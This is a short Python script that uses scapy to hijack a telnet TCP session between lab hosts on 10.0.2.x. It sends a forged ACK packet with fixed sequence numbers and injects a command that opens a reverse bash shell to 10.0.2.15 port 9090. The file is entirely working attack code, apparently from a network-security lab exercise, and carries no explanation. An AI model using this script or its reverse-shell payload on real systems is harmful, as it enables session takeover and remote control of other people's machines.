#!/usr/bin/python
import sys
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET...")
IPLayer = IP(src="10.0.2.5",dst="10.0.2.4")
TCPLayer = TCP(sport=56988,dport=23, flags="A", seq=4268460759, ack=3034416232)

Data = "\r /bin/bash -i > /dev/tcp/10.0.2.15/9090 2>&1 0<&1\n"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt, verbose= 0)
